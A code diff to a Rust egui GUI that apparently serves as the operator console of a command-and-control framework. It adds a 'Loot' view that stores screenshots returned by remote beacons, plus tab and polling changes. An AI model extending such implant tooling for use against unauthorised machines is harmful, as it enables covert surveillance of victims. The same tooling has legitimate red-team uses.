@@ -1,7 +1,11 @@
+use crate::gui::screenshot::ScreenshotHandler;
 use crate::models::{Beacon, BeaconSession, Command, NewCommand, Tab, View};
 use crate::utils::formatter::format_ls_output;
+use base64::Engine as _;
+use chrono;
 use eframe::egui;
-use egui_dock::DockState;
+use egui::ColorImage;
+use egui_dock::{DockState, TabViewer};
 use egui_phosphor::regular;
 use reqwest::blocking::Client as ReqwestClient;
 use serde_json;
@@ -11,6 +15,12 @@ use std::sync::{Arc, Mutex};
 use std::thread;
 use std::time::Duration;
 use std::time::Instant;
+
+impl AsMut<DockState<Tab>> for GuiClient {
+    fn as_mut(&mut self) -> &mut DockState<Tab> {
+        &mut self.dock_state
+    }
+}
 
 /// Main GUI client for the application
 pub struct GuiClient {
@@ -37,6 +47,12 @@ pub struct GuiClient {
     pub poll_interval_ms: u64, // Polling interval in milliseconds
     pub pending_command_ids: HashMap<String, Vec<i64>>, // Track pending commands by beacon ID
     pub processed_command_ids: HashSet<String>, // Track already processed command IDs
+
+    // Store egui context
+    pub egui_ctx: Option<egui::Context>,
+
+    // Store captured screenshots
+    pub screenshots: Vec<(String, String, String)>, // (beacon_id, timestamp, base64_data)
 }
 
 impl GuiClient {
@@ -67,6 +83,8 @@ impl GuiClient {
             poll_interval_ms: 150, // Poll every 150ms instead of 1000ms
             pending_command_ids: HashMap::new(),
             processed_command_ids: HashSet::new(),
+            egui_ctx: Some(cc.egui_ctx.clone()),
+            screenshots: Vec::new(),
         };
 
         // Start beacon polling thread
@@ -473,40 +491,87 @@ impl GuiClient {
                                     // Add a separator before the result for visual clarity
                                     session.command_output.push(String::new()); // empty line
 
-                                    // Add the actual result with nice formatting
-                                    let output = if result.starts_with('{') && result.ends_with('}')
-                                    {
-                                        // Try to parse and prettify JSON results
-                                        match serde_json::from_str::<serde_json::Value>(result) {
-                                            Ok(json) => match serde_json::to_string_pretty(&json) {
-                                                Ok(pretty) => pretty,
-                                                Err(_) => result.clone(),
-                                            },
-                                            Err(_) => result.clone(),
+                                    // Try to parse and prettify JSON results
+                                    match serde_json::from_str::<serde_json::Value>(result) {
+                                        Ok(json) => {
+                                            // Check if this is a screenshot response
+                                            let mut output = String::new();
+
+                                            if let Some(response_type) =
+                                                json.get("type").and_then(|t| t.as_str())
+                                            {
+                                                if response_type == "screenshot_response" {
+                                                    if let Some(screenshot_data) =
+                                                        json.get("data").and_then(|d| d.as_str())
+                                                    {
+                                                        // Store the screenshot with current timestamp
+                                                        let timestamp = chrono::Local::now()
+                                                            .format("%Y-%m-%d %H:%M:%S")
+                                                            .to_string();
+
+                                                        // Store the screenshot data
+                                                        self.screenshots.push((
+                                                            beacon_id.clone(),
+                                                            timestamp,
+                                                            screenshot_data.to_string(),
+                                                        ));
+
+                                                        output = "Screenshot captured and stored in Loot.".to_string();
+
+                                                        // Get the context before the mutable borrow
+                                                        if let Some(ctx) = &self.egui_ctx {
+                                                            ctx.request_repaint();
+                                                        }
+                                                    }
+                                                }
+                                            }
+
+                                            if output.is_empty() {
+                                                // Not a screenshot, format as pretty JSON
+                                                output = match serde_json::to_string_pretty(&json) {
+                                                    Ok(pretty) => pretty,
+                                                    Err(_) => result.clone(),
+                                                };
+                                            }
+
+                                            session.command_output.push(output);
+
+                                            // Mark this command as processed using a global set
+                                            self.processed_command_ids.insert(cmd.id.to_string());
+
+                                            // Remove this command from pending list if it exists
+                                            if let Some(idx) =
+                                                pending.iter().position(|&id| id == cmd.id)
+                                            {
+                                                pending.remove(idx);
+                                            }
                                         }
-                                    } else {
-                                        result.clone()
-                                    };
-
-                                    session.command_output.push(output);
-
-                                    // Mark this command as processed using a global set
-                                    // instead of per-beacon set to ensure no duplication
-                                    self.processed_command_ids.insert(cmd.id.to_string());
-
-                                    // Remove this command from pending list if it exists
-                                    if let Some(idx) = pending.iter().position(|&id| id == cmd.id) {
-                                        pending.remove(idx);
+                                        Err(_) => {
+                                            session.command_output.push(result.clone());
+                                            self.processed_command_ids.insert(cmd.id.to_string());
+                                            if let Some(idx) =
+                                                pending.iter().position(|&id| id == cmd.id)
+                                            {
+                                                pending.remove(idx);
+                                            }
+                                        }
                                     }
                                 }
                             }
                         }
                     }
                 }
-                Err(_) => {
-                    // Failed to fetch commands, but we'll silently ignore for now
+                Err(e) => {
+                    println!("[DEBUG] Failed to fetch commands: {}", e);
                 }
             }
+        }
+    }
+
+    /// Request a repaint of the UI
+    pub fn request_repaint(&self) {
+        if let Some(ctx) = &self.egui_ctx {
+            ctx.request_repaint();
         }
     }
 }
@@ -565,6 +630,8 @@ impl eframe::App for GuiClient {
                     self.render_nav_button(ui, regular::DESKTOP_TOWER, View::Beacons, "Beacons");
                     ui.add_space(8.0);
                     self.render_nav_button(ui, regular::BROADCAST, View::Listeners, "Listeners");
+                    ui.add_space(8.0);
+                    self.render_nav_button(ui, regular::IMAGE, View::Loot, "Loot");
                     ui.with_layout(egui::Layout::bottom_up(egui::Align::Center), |ui| {
                         ui.add_space(10.0); // Space below settings button
                         self.render_nav_button(ui, regular::GEAR_SIX, View::Settings, "Settings");
@@ -585,6 +652,9 @@ impl eframe::App for GuiClient {
             }
             View::Settings => {
                 self.render_settings_view(ui);
+            }
+            View::Loot => {
+                self.render_loot_view(ui);
             }
         });
 
@@ -640,6 +710,60 @@ impl eframe::App for GuiClient {
                 self.delete_modal_open = false;
                 self.beacon_to_delete = None;
             }
+        }
+    }
+}
+
+impl TabViewer for GuiClient {
+    type Tab = Tab;
+
+    fn ui(&mut self, ui: &mut egui::Ui, tab: &mut Self::Tab) {
+        match tab {
+            Tab::Beacon(beacon_id) => {
+                // Find or create session for this beacon
+                let session_idx = self.find_or_create_session(beacon_id);
+
+                // Show the beacon command interface
+                self.render_beacon_session(ui, session_idx);
+            }
+            Tab::Screenshot(_) => {
+                // Screenshot tabs are no longer used
+            }
+        }
+    }
+
+    fn title(&mut self, tab: &mut Self::Tab) -> egui::WidgetText {
+        match tab {
+            Tab::Beacon(beacon_id) => {
+                if let Ok(beacons) = self.beacons.lock() {
+                    if let Some(beacon) = beacons.iter().find(|b| &b.id == beacon_id) {
+                        format!("Beacon: {}", beacon.id)
+                    } else {
+                        format!("Beacon: {}", beacon_id)
+                    }
+                } else {
+                    format!("Beacon: {}", beacon_id)
+                }
+            }
+            Tab::Screenshot(_) => "Screenshot".to_string(),
+        }
+        .into()
+    }
+
+    fn on_close(&mut self, tab: &mut Self::Tab) -> bool {
+        match tab {
+            Tab::Beacon(beacon_id) => {
+                // Find and remove the session
+                if let Some(idx) = self
+                    .active_sessions
+                    .iter()
+                    .position(|s| &s.beacon_id == beacon_id)
+                {
+                    self.active_sessions.remove(idx);
+                }
+                true // Allow the tab to close
+            }
+            Tab::Screenshot(_) => true, // Always allow screenshot tabs to close
         }
     }
 }
